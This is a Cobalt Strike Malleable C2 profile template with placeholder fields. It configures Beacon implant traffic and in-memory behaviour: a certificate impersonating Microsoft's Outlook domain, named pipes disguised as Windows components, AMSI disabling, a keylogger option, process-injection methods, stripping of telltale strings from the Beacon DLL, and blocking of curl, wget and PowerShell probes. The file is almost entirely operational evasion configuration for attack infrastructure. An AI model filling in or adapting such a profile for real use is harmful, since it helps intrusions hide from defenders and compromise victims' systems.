################################################
# Malleable C2 Profile
# Version: Cobalt Strike 4.11
# Date   : %Date%

################################################

## Profile Name
################################################
set sample_name "%name%";

################################################
## Sleep Times
################################################
set sleeptime "%sleep%";       # 5 Minutes
#set sleeptime "350000";       # 5.8 Minutes.. average video length :)
set jitter    "%jitter%";	   # % jitter     

################################################
##  Server Response Size jitter
################################################
set data_jitter "%data_jitter%"; # Append random-length string

################################################
## Task and Proxy Max Size
################################################
set tasks_max_size "1572864";
set tasks_proxy_max_size "921600";
set tasks_dns_proxy_max_size "71680";

################################################
## Beacon User-Agent
################################################

set useragent "%user_agent%";

################################################
## Beacon Library Data
################################################
http-beacon {
    set library "%library%"; # Options: Winhttp, Wininet
    set data_required "false";
}

################################################
## SSL CERTIFICATE
# Just a sample certificate this can be mofified if wished
################################################
https-certificate { # Simple self signed certificate data
    
    set CN       "*.outlook.office365.com"; #Common Name
    set O        "Microsoft Corporation"; #Orgainization Name
    set OU	 	 "MC"; #Organizational Unit Name
    set C        "US"; #Country
    set ST       "Washington"; #State or Province
    set validity "365"; #Number of days the cert is valid
}

################################################
## TCP Beacon
################################################
set tcp_port "1423"; # TCP beacion listen port
set tcp_frame_header "\x80\x90"; # Prepend header to TCP Beacon messages

################################################
## SMB beacons
################################################
set pipename "Winsock2\\CatalogChangeListener-###-0"; # Name of pipe for SMB sessions. Each # is replaced with a random hex value.
set pipename_stager "ShortcutNotifier_####"; # Name of pipe to use for SMB Beacon's named pipe stager. Each # is replaced with a random hex value.

set smb_frame_header "\x40\x90\x82"; # Prepend header to SMB Beacon messages

################################################
## DNS beacons
################################################

# Edit this as you wish if DNS beacons are utilized

#dns-beacon {
#    set dns_idle           "8.8.8.8"; # IP address used to indicate no tasks are available to DNS Beacon; Mask for other DNS C2 values
#    set dns_max_txt        "252"; # Maximum length of DNS TXT responses for tasks
#    set dns_sleep          "2"; # Force a sleep prior to each individual DNS request. (in milliseconds) 
#    set dns_ttl            "4"; # TTL for DNS replies
#    set maxdns             "240"; # Maximum length of hostname when uploading data over DNS (0-255)
#    set dns_stager_prepend ".apptel.64."; # Prepend data used by DNS TXT record stager
#    set dns_stager_subhost ".api."; # Subdomain used by DNS TXT record stager
#    set beacon             "a.ef."; # 8 Char max recommended. DNS subhost prefix
#    set get_A              "d.sa."; # 8 Char max recommended. DNS subhost prefix
#    set get_AAAA           "d.ta."; # 8 Char max recommended. DNS subhost prefix
#    set get_TXT            "t.gt."; # 8 Char max recommended. DNS subhost prefix
#    set put_metadata       "p.md."; # 8 Char max recommended. DNS subhost prefix
#    set put_output         "p.ot."; # 8 Char max recommended. DNS subhost prefix
#    set ns_response        "zero"; # How to process NS Record requests. "drop" does not respond to the request (default), "idle" responds with A record for IP address from "dns_idle", "zero" responds with A record for 0.0.0.0

#}


################################################
## SSH beacons
################################################
set ssh_banner        "OpenSSH_7.4 RedHat (protocol 2.0)"; # SSH client banner
set ssh_pipename      "ShortcutNotifier_####"; # Name of pipe for SSH sessions. Each # is replaced with a random hex value.


################################################
## Staging process
# This is left alone since stagers are less likely to be utilized
################################################
set host_stage "false"; # WARNING Set to false to disable staging behavior. Host payload for staging over HTTP, HTTPS, or DNS. Required by stagers.set

http-stager {
    set uri_x86 "/analytics/"; # URI for x86 staging
    set uri_x64 "/mail/"; # URI for x64 staging

    server {
        header "Strict-Transport-Security:" "max-age=43800; includeSubDomains; preload"; 
        header "X-Content-Type-Options:" "nosniff";
        header "Access-Control-Allow-Credentials:" "true";
        header "Content-Type" "text/html; charset=iso-8859-1";
        header "Vary" "Accept-Encoding";
        header "Server" "Microsoft-IIS/10.0";
        header "Connection" "close";
        output {
            prepend "?tele;";
            append ".;telemetry";
            print;
        }
    }

    client {
        header "Accept" "*/*";
        header "Accept-Language" "en";
        header "Connection" "close";
    }
}

################################################
## Post Exploitation
################################################
post-ex {
    set spawnto_x86 "%windir%\\syswow64\\%spawn_to%.exe";
    set spawnto_x64 "%windir%\\sysnative\\%spawn_to%.exe";
    set obfuscate "true";
    set smartinject "true";
    set amsi_disable "true";
    set pipename "Winsock2\\CatalogChangeListener-###-0"; # Common Chrome named pipe
    set keylogger "GetAsyncKeyState"; # options are GetAsyncKeyState or SetWindowsHookEx
}


################################################
## Memory Indicators
################################################
stage {
    set allocator      "MapViewOfFile"; # Set how Beacon's Reflective Loader allocates memory for the agent. Options are: HeapAlloc, MapViewOfFile, and VirtualAlloc. (Note: HeapAlloc uses RXW)
    set magic_mz_x86   "GOGO";
    set magic_mz_x64   "A^AV";
    set magic_pe       "GO";
    set stomppe        "true";
    set obfuscate      "true"; # review sleepmask and UDRL considerations for obfuscate
    set cleanup        "true";
    set sleep_mask     "true";
    set smartinject    "true";
    
	# PE information
    set checksum       "0";
    set compile_time   "31 Oct 2015 15:43:08";
    set entry_point    "618533";
    set image_size_x86 "552416";
    set image_size_x64 "552416";
    set name           "hnetmoni.dll"; #hnetmon.dll does exist in system32
    set rich_header    "\x94\xe1\xe1\x9e\xd0\x80\x8f\xcd\xd0\x80\x8f\xcd\xd0\x80\x8f\xcd\x47\x44\xf1\xcd\xd7\x80\x8f\xcd\xf7\x46\xf2\xcd\xd7\x80\x8f\xcd\xf7\x46\xe2\xcd\xe4\x80\x8f\xcd\xf7\x46\xf4\xcd\xf9\x80\x8f\xcd\xd0\x80\x8e\xcd\x7b\x82\x8f\xcd\xf7\x46\xe1\xcd\x5f\x80\x8f\xcd\xf7\x46\xf3\xcd\xd1\x80\x8f\xcd\xf7\x46\xf7\xcd\xd1\x80\x8f\xcd\x52\x69\x63\x68\xd0\x80\x8f\xcd\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
	
	# Syscall Method
	set syscall_method "%syscall%";
	
	# Beacon Gate
	beacon_gate {
%api%
	}

    # The transform-x86 and transform-x64 blocks pad and transform Beacon's Reflective DLL stage. These blocks support three commands: prepend, append, and strrep.
    transform-x86 {
        prepend "\x66\x0f\x1f\x84\x00\x00\x00\x00\x00"; # prepend null bytes
        strrep "ReflectiveLoader" "Append"; # Change this text
        strrep "This program cannot be run in DOS mode" ""; # Remove this text
        strrep "beacon.dll" ""; # Remove this text
		strrep "%name%" "";
        strrep "NtQueueApcThread" "";
        strrep "HTTP/1.1 200 OK" "";
        strrep "Stack memory was corrupted" "";     
        strrep "KERNEL32.dll" "";
        strrep "ADVAPI32.dll" "";
        strrep "WININET.dll" "";
        strrep "WS2_32.dll" "";
        strrep "DNSAPI.dll" "";
        strrep "Secur32.dll" "";
        strrep "VirtualProtectEx" "";
        strrep "VirtualProtect" "";
        strrep "VirtualAllocEx" "";
        strrep "VirtualAlloc" "";
        strrep "VirtualFree" "";
        strrep "VirtualQuery" "";
        strrep "RtlVirtualUnwind" "";
        strrep "sAlloc" "";
        strrep "FlsFree" "";
        strrep "FlsGetValue" "";
        strrep "FlsSetValue" "";
        strrep "InitializeCriticalSectionEx" "";
        strrep "CreateSemaphoreExW" "";
        strrep "SetThreadStackGuarantee" "";
        strrep "CreateThreadpoolTimer" "";
        strrep "SetThreadpoolTimer" "";
        strrep "WaitForThreadpoolTimerCallbacks" "";
        strrep "CloseThreadpoolTimer" "";
        strrep "CreateThreadpoolWait" "";
        strrep "SetThreadpoolWait" "";
        strrep "CloseThreadpoolWait" "";
        strrep "FlushProcessWriteBuffers" "";
        strrep "FreeLibraryWhenCallbackReturns" "";
        strrep "GetCurrentProcessorNumber" "";
        strrep "GetLogicalProcessorInformation" "";
        strrep "CreateSymbolicLinkW" "";
        strrep "SetDefaultDllDirectories" "";
        strrep "EnumSystemLocalesEx" "";
        strrep "CompareStringEx" "";
        strrep "GetDateFormatEx" "";
        strrep "GetLocaleInfoEx" "";
        strrep "GetTimeFormatEx" "";
        strrep "GetUserDefaultLocaleName" "";
        strrep "IsValidLocaleName" "";
        strrep "LCMapStringEx" "";
        strrep "GetCurrentPackageId" "";
        strrep "UNICODE" "";
        strrep "UTF-8" "";
        strrep "UTF-16LE" "";
        strrep "MessageBoxW" "";
        strrep "GetActiveWindow" "";
        strrep "GetLastActivePopup" "";
        strrep "GetUserObjectInformationW" "";
        strrep "GetProcessWindowStation" "";
        strrep "Sunday" "";
        strrep "Monday" "";
        strrep "Tuesday" "";
        strrep "Wednesday" "";
        strrep "Thursday" "";
        strrep "Friday" "";
        strrep "Saturday" "";
        strrep "January" "";
        strrep "February" "";
        strrep "March" "";
        strrep "April" "";
        strrep "June" "";
        strrep "July" "";
        strrep "August" "";
        strrep "September" "";
        strrep "October" "";
        strrep "November" "";
        strrep "December" "";
        strrep "MM/dd/yy" "";
        strrep "Stack memory around _alloca was corrupted" "";
        strrep "Unknown Runtime Check Error" "";
        strrep "Unknown Filename" "";
        strrep "Unknown Module Name" "";
        strrep "Run-Time Check Failure #%d - %s" "";
        strrep "Stack corrupted near unknown variable" "";
        strrep "Stack pointer corruption" "";
        strrep "Cast to smaller type causing loss of data" "";
        strrep "Stack memory corruption" "";
        strrep "Local variable used before initialization" "";
        strrep "Stack around _alloca corrupted" "";
        strrep "RegOpenKeyExW" "";
        strrep "egQueryValueExW" "";
        strrep "RegCloseKey" "";
        strrep "LibTomMath" "";
        strrep "Wow64DisableWow64FsRedirection" "";
        strrep "Wow64RevertWow64FsRedirection" "";
        strrep "Kerberos" "";
    }

    transform-x64 { # transform the x64 rDLL stage
        prepend "\x66\x0f\x1f\x84\x00\x00\x00\x00\x00"; # prepend null bytes
        strrep "ReflectiveLoader" "Append"; # Change this text
        strrep "This program cannot be run in DOS mode" ""; # Remove this text
        strrep "beacon.x64.dll" ""; # Remove this text
		strrep "%name%" "";
        strrep "NtQueueApcThread" "";
        strrep "HTTP/1.1 200 OK" "";
        strrep "Stack memory was corrupted" "";
        strrep "beacon.dll" "";
        strrep "KERNEL32.dll" "";
        strrep "ADVAPI32.dll" "";
        strrep "WININET.dll" "";
        strrep "WS2_32.dll" "";
        strrep "DNSAPI.dll" "";
        strrep "Secur32.dll" "";
        strrep "VirtualProtectEx" "";
        strrep "VirtualProtect" "";
        strrep "VirtualAllocEx" "";
        strrep "VirtualAlloc" "";
        strrep "VirtualFree" "";
        strrep "VirtualQuery" "";
        strrep "RtlVirtualUnwind" "";
        strrep "sAlloc" "";
        strrep "FlsFree" "";
        strrep "FlsGetValue" "";
        strrep "FlsSetValue" "";
        strrep "InitializeCriticalSectionEx" "";
        strrep "CreateSemaphoreExW" "";
        strrep "SetThreadStackGuarantee" "";
        strrep "CreateThreadpoolTimer" "";
        strrep "SetThreadpoolTimer" "";
        strrep "WaitForThreadpoolTimerCallbacks" "";
        strrep "CloseThreadpoolTimer" "";
        strrep "CreateThreadpoolWait" "";
        strrep "SetThreadpoolWait" "";
        strrep "CloseThreadpoolWait" "";
        strrep "FlushProcessWriteBuffers" "";
        strrep "FreeLibraryWhenCallbackReturns" "";
        strrep "GetCurrentProcessorNumber" "";
        strrep "GetLogicalProcessorInformation" "";
        strrep "CreateSymbolicLinkW" "";
        strrep "SetDefaultDllDirectories" "";
        strrep "EnumSystemLocalesEx" "";
        strrep "CompareStringEx" "";
        strrep "GetDateFormatEx" "";
        strrep "GetLocaleInfoEx" "";
        strrep "GetTimeFormatEx" "";
        strrep "GetUserDefaultLocaleName" "";
        strrep "IsValidLocaleName" "";
        strrep "LCMapStringEx" "";
        strrep "GetCurrentPackageId" "";
        strrep "UNICODE" "";
        strrep "UTF-8" "";
        strrep "UTF-16LE" "";
        strrep "MessageBoxW" "";
        strrep "GetActiveWindow" "";
        strrep "GetLastActivePopup" "";
        strrep "GetUserObjectInformationW" "";
        strrep "GetProcessWindowStation" "";
        strrep "Sunday" "";
        strrep "Monday" "";
        strrep "Tuesday" "";
        strrep "Wednesday" "";
        strrep "Thursday" "";
        strrep "Friday" "";
        strrep "Saturday" "";
        strrep "January" "";
        strrep "February" "";
        strrep "March" "";
        strrep "April" "";
        strrep "June" "";
        strrep "July" "";
        strrep "August" "";
        strrep "September" "";
        strrep "October" "";
        strrep "November" "";
        strrep "December" "";
        strrep "MM/dd/yy" "";
        strrep "Stack memory around _alloca was corrupted" "";
        strrep "Unknown Runtime Check Error" "";
        strrep "Unknown Filename" "";
        strrep "Unknown Module Name" "";
        strrep "Run-Time Check Failure #%d - %s" "";
        strrep "Stack corrupted near unknown variable" "";
        strrep "Stack pointer corruption" "";
        strrep "Cast to smaller type causing loss of data" "";
        strrep "Stack memory corruption" "";
        strrep "Local variable used before initialization" "";
        strrep "Stack around _alloca corrupted" "";
        strrep "RegOpenKeyExW" "";
        strrep "egQueryValueExW" "";
        strrep "RegCloseKey" "";
        strrep "LibTomMath" "";
        strrep "Wow64DisableWow64FsRedirection" "";
        strrep "Wow64RevertWow64FsRedirection" "";
        strrep "Kerberos" "";
    }

}

################################################
## Process Injection
################################################
process-inject {

    set allocator "%injection%"; # Options: VirtualAllocEx, NtMapViewOfSection 
    set min_alloc "17500"; # 	Minimum amount of memory to request for injected content
    set startrwx "false"; # Use RWX as initial permissions for injected content. Alternative is RW.
    
    # review sleepmask and UDRL considerations for userwx
    set userwx   "false"; # Use RWX as final permissions for injected content. Alternative is RX.

    transform-x86 { 
        # Make sure that prepended data is valid code for the injected content's architecture (x86, x64). The c2lint program does not have a check for this.
        prepend "\x0f\x1f\x40\x00";
        append "\x50\x58";
    }

    transform-x64 {
        # Make sure that prepended data is valid code for the injected content's architecture (x86, x64). The c2lint program does not have a check for this.
        prepend "\x0f\x1f\x40\x00";
        append "\x50\x58";
    }
  
    execute {
        # Beacon examines each option in the execute block, determines if the option is usable for the current context, tries the method when it is usable, and moves on to the next option if code execution did not happen. 
        CreateThread "kernel32.dll!ContinueDebugEvent+0x90";
        NtQueueApcThread-s;
        NtQueueApcThread;
        CreateRemoteThread "ntdll.dll!RtlUserThreadStart+0x90"; 
        RtlCreateUserThread;
    }
}


################################################
## Operator should edit this manually
################################################

################################################
# Will probably use placeholders in the future
# to replace this automatically
# TO-DO
################################################

################################################
## HTTP Headers
################################################
http-config { # The http-config block has influence over all HTTP responses served by Cobalt Strike’s web server. 
    set headers "Date, Server, Content-Length, Keep-Alive, Connection, Content-Type";
    
	# Use this option if your teamserver is behind a redirector
    set trust_x_forwarded_for "%forward%";
    
	# Block Specific User Agents with a 404
    set block_useragents "curl*, lynx*, wget*, ncat*, python-requests*, *WindowsPowerShell*";
    
	# Allow Specific User Agents
    # allow_useragents ""; (if specified, block_useragents will take precedence)
}

################################################
## HTTP GET
################################################
%GET%

################################################
## HTTP POST
################################################
%POST%